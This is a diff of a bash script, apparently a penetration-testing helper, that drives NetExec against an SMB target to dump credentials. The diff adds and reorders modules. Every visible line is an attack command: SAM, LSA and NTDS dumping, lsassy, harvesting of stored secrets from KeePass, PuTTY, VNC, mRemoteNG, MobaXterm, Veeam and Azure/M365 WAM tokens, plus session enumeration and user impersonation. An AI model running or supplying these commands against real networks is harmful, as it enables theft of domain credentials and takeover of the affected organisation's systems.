@@ -169,7 +169,7 @@ case "$MODE" in
 elevated)
   log "Starting credential and information collection…"
   
-  # Credential extraction commands
+  # Main credential dumping
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sam
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M lsassy
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --lsa
@@ -183,31 +183,42 @@ elevated)
   log "Running: nxc smb $TARGET $AUTH_ARGS --ntds" "$CREDFILE"
   script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"
   
-  # Interesting information commands
+  # Interesting information commands (in order from nxc smb -L)
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M bitlocker
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M eventlog_creds
+  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M handlekatz # Need handlekatz on system
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M iis
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M hash_spider
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M keepass_discover
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recent_files
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M snipped
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M runasppl
+  log "Use -M keepass_trigger if found" "$INTERESTINGFILE"
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mobaxterm
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mremoteng
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M msol
+  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M nanodump # Require nanodump on system
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad++
+  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M ntds-dump-raw # We have ntdsutil?
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history -o EXPORT=True # The flag migth not work - remove if so
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M iis
+  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M procdump # Require pypykatz
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M putty
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recent_files
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recyclebin
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M reg-winlogon
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M security-questions
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M snipped
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M teams_localdb
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M veeam
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M vnc
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wam # Azure and M365 tokens
+
+  # Other session enumeration
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M get_netconnections
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M runasppl
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS --qwinsta
   log "Look at \"Impersonate logged-on User\" section in wiki in case of found sessions" "$INTERESTINGFILE"
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M impersonate
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad++
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M eventlog_creds
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wam # Azure and M365 tokens
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M veeam
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M putty
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M vnc
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mremoteng
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M teams_localdb
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M security-questions
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wcc # Security conf
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M get_netconnections
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mobaxterm
 
 
   log "Extracting potential credential lines…"
